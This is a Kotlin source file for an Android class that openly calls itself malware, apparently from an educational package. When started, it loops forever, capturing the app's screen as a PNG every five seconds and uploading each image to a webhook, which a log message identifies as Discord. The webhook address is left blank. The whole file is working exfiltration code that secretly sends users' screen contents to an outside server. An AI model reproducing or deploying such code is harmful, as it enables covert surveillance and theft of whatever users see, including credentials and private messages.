package com.howest.screenshotmalware

import android.app.Activity
import android.graphics.Bitmap
import android.graphics.Canvas
import android.util.Log
import android.view.View
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.time.LocalDateTime

class One(private val activity: Activity) {
    private val webhookUrl = ""
    private val client = OkHttpClient()

    fun start() {
        Log.i("MALWARE", "Hello there!")
        activity.window.decorView.post {
            GlobalScope.launch {
                while (true) {
                    takeScreenshotAndSend()
                    delay(5000)
                }
            }
        }
    }

    private fun takeScreenshotAndSend() {
        try {
            val screenshot = takeScreenShot().toByteArray()

            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file1", "screenshot.png", screenshot.toRequestBody("image/png".toMediaType()))
                .build()

            // for success -> <uses-permission android:name="android.permission.INTERNET" />
            val request = Request.Builder()
                .url(webhookUrl)
                .post(body)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("ScreenshotSender", "Failed to send screenshot: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d("ScreenshotSender", "Screenshot sent successfully to Discord at ${LocalDateTime.now()}")
                    } else {
                        Log.e("ScreenshotSender", "Failed to send screenshot: ${response}")
                    }
                }
            })
        } catch (e: Exception) {
            Log.e("ScreenshotSender", "Error occurred while sending screenshot: ${e.message}")
        }
    }

    private fun takeScreenShot(): ByteArrayOutputStream {
        val rootView = activity.window.decorView.rootView
        val bitmap: Bitmap = getBitmapFromView(rootView)
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
        return outputStream
    }

    private fun getBitmapFromView(view: View): Bitmap {
        val bitmap = Bitmap.createBitmap(
            view.width, view.height, Bitmap.Config.ARGB_8888
        )
        val canvas = Canvas(bitmap)
        view.draw(canvas)
        return bitmap
    }
}
